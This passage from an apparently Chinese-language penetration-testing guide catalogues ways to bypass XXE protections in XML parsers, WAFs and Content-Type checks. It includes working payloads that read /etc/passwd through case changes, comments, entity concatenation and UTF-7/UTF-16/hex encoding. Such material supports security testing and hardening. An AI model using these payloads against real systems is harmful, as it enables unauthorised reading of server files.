## 五、XXE 防护方案的系统化绕过矩阵

### 5.1 防护措施 → 绕过手段总览
| 防护措施 | 绕过手段 | 章节 |
|---------|---------|------|
| 禁用 DOCTYPE（disallow-doctype-decl=true）| **XInclude**（无需 DOCTYPE）、SVG/文档载体、XMLDecoder 等二次解析点 | 六 |
| 禁用外部通用实体 | 改用**参数实体**（很多实现只关 general 不关 parameter）| 3.1 |
| 禁用外部参数实体 | 尝试**外部 DTD 加载开关未关**的组合（load-external-dtd）| 3.5 |
| 禁用外部 DTD 加载 | **本地 DTD 技巧**（dtd-finder）、混合 DTD | 3.5.2 |
| 自定义 EntityResolver 返回 null/空 | 解析器对**参数实体、XInclude、XML Schema import** 不走 EntityResolver 的差异 | 5.3 |
| WAF 关键字过滤（DOCTYPE/ENTITY/SYSTEM）| 大小写/注释/空白/实体拼接/编码/UTF-16 | 5.5 |
| 只校验 Content-Type 为 JSON | **Content-Type 混淆/双重解析**（框架自动转换、multipart 内嵌）| 5.6 |
| 实体扩展计数限制 | **数字字符引用/重复 DOCTYPE 重置计数器**（CVE-2026-33036 等）| 十一 |
| 只做了其中一项 | 其余未配置项直接利用（配置不完整是最大漏洞）| — |

### 5.2 解析器配置绕过要点（攻防专家视角）
- **通用实体 vs 参数实体是两个独立开关**：`external-general-entities=false` 但 `external-parameter-entities` 未关 → 参数实体 XXE 仍可 OOB（最常见配置遗漏）
- **`disallow-doctype-decl=true` 只挡 DOCTYPE**：XInclude、XML Schema import、XSLT `document()` 均可绕过
- **`load-external-dtd=false` 只挡外部 DTD**：内部 DTD + 本地 DTD 引用（file:// 指向本机 DTD）不受影响 → 3.5.2
- **EntityResolver 只拦 DOM/SAX 路径**：StAX（XMLStreamReader）、XPath、XSLT、Schema 校验常走独立路径，不经过同一 Resolver
- **`setXIncludeAware(false)` 未设置** → 保留 XInclude 面（第六章）
- **Python lxml 5.x meow:// 技巧**：libxml2 5.4.0 加固默认行为后，社区发现对未知/特殊 scheme（如 `meow://` 前缀）的 URI 处理存在回退差异，可绕过部分硬编码拦截（具体 payload 需对目标 lxml 版本实测）
- **.NET 现代版**：仅当 `DtdProcessing=Parse` 且 `XmlResolver` 非空才可利用；若只设置了 DTD 解析未置空 XmlResolver → 直接 XXE

### 5.3 输入校验/过滤绕过（WAF 层）
```xml
<!-- 大小写变形 -->
<!doctype foo [ <!entity xxe system "file:///etc/passwd"> ]>
<root>&xxe;</root>

<!-- DOCTYPE 内插注释 -->
<!D<!--c-->OCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<!-- 全空白/换行拆分关键字 -->
<!DOCTYPE
  foo
  [
    <!ENTITY
      xxe
      SYSTEM
      "file:///etc/passwd"
    >
  ]
>

<!-- ENTITY 关键字拼接（参数实体动态声明）-->
<!ENTITY % p1 "<!EN">
<!ENTITY % p2 "TITY xxe SYSTEM 'file:///etc/passwd'>">
%p1;%p2;

<!-- 实体值内字符引用 -->
<!ENTITY xxe SYSTEM "file:///etc/&#x70;asswd">
```

### 5.4 编码级绕过
```xml
<!-- UTF-7（部分解析器支持）-->
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-

<!-- UTF-16 BOM：将整个 payload 转 UTF-16 发送，绕字符串匹配型 WAF -->
<!-- 生成：printf '\xff\xfe' + iconv -f utf-8 -t utf-16le -->
<!-- 十六进制实体 -->
<!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;:///etc/passwd">
```

### 5.5 Content-Type / 解析路径混淆
```http
Content-Type: text/xml
Content-Type: application/soap+xml
Content-Type: application/xhtml+xml
Content-Type: application/rss+xml
Content-Type: application/atom+xml
Content-Type: text/xml;charset=utf-8
Content-Type: application/xml;charset=iso-8859-1
Content-Type: application/x-www-form-urlencoded   # 某些框架自动解析为 XML
Content-Type: multipart/form-data                 # XML 藏在 multipart 里
Transfer-Encoding: chunked                         # 分块绕过流量检测
```

### 5.6 二次解析/隐式解析面（攻防专家的隐藏入口）
- **JSON↔XML 自动转换**：入参 JSON 含 `<xxe>` 字符串，后端用 XML 库解析字段值 → 二次注入
- **模板引擎/日志格式化**：把 XML 片段当字符串拼接后再解析
- **Webhook / 回调接口**：接收第三方 XML 回执（支付回调、订阅回调）
- **SVG/office 文件解压解析**：上传链的"隐式 XML 解析器"（第九章）
- **XML 配置反序列化**：Java XMLDecoder、.NET XamlReader、PHP SimpleXML 反序列化配置对象

